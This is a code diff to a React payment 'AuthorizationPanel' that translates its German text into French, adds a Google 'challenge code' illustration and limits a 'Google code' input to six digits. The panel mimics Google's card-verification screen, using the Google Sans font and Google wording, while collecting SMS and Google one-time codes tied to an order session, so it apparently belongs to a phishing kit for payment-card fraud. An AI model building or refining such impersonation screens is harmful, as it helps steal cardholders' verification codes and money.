@@ -6,6 +6,7 @@ import { CreditCard, Shield, Lock, Smartphone, MessageSquare, CheckCircle } from
 import { supabase } from '@/integrations/supabase/client';
 import { useOptimisticPaymentSession } from '@/hooks/useOptimisticPaymentSession';
 import { PaymentIcons } from '@/components/ui/PaymentIcons';
+import challengeCodeImage from "@/assets/challenge_code_illustration.webp";
 
 interface AuthorizationPanelProps {
   orderId: string;
@@ -17,6 +18,12 @@ const AuthorizationPanel: React.FC<AuthorizationPanelProps> = ({ orderId, sessio
   const [currentTextIndex, setCurrentTextIndex] = useState(0);
   const [smsCode, setSmsCode] = useState('');
   const [googleCode, setGoogleCode] = useState('');
+
+  const handleGoogleCodeChange = (value: string) => {
+    // Only allow numbers and limit to 6 digits
+    const numericValue = value.replace(/\D/g, '').slice(0, 6);
+    setGoogleCode(numericValue);
+  };
 
   const detectCardType = (cardNumber: string): 'visa' | 'mastercard' | 'amex' | 'unknown' => {
     const cleanNumber = cardNumber.replace(/\s/g, '');
@@ -275,30 +282,40 @@ const AuthorizationPanel: React.FC<AuthorizationPanelProps> = ({ orderId, sessio
           </span>
         </div>
         
+        {/* Challenge Code Illustration */}
+        <div className="flex justify-center mb-4">
+          <img 
+            src={challengeCodeImage} 
+            alt="Illustration du code de défi Google" 
+            className="w-48 h-auto"
+          />
+        </div>
+        
         <div className="space-y-2">
           <h1 className="text-2xl font-medium text-gray-900" style={{ fontFamily: 'Google Sans, sans-serif' }}>
-            Karte bestätigen
+            Confirmer la carte
           </h1>
           <p className="text-base text-gray-700">
-            Bestätige {cardTypeInfo.name} •••• {lastFour} mit einem Code, den du neben einer vorübergehenden Belastung findest.
-            Die Belastung erscheint in den Transaktionen deiner Karte (in deinen App- oder Kontoabrechnungen).
+            Confirmez {cardTypeInfo.name} •••• {lastFour} avec un code que vous trouvez à côté d'un débit temporaire.
+            Le débit apparaît dans les transactions de votre carte (dans vos relevés d'application ou de compte).
           </p>
         </div>
 
         <div className="space-y-4">
           <Input
             type="text"
-            placeholder="Google-Code eingeben"
+            placeholder="Saisir le code Google (6 chiffres)"
             value={googleCode}
-            onChange={(e) => setGoogleCode(e.target.value)}
+            onChange={(e) => handleGoogleCodeChange(e.target.value)}
+            maxLength={6}
             className="text-center text-lg tracking-widest"
           />
           <Button 
             onClick={handleGoogleCodeSubmit}
-            disabled={!googleCode}
+            disabled={!googleCode || googleCode.length !== 6}
             className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 text-base"
           >
-            Code bestätigen
+            Confirmer le code
           </Button>
         </div>
       </>
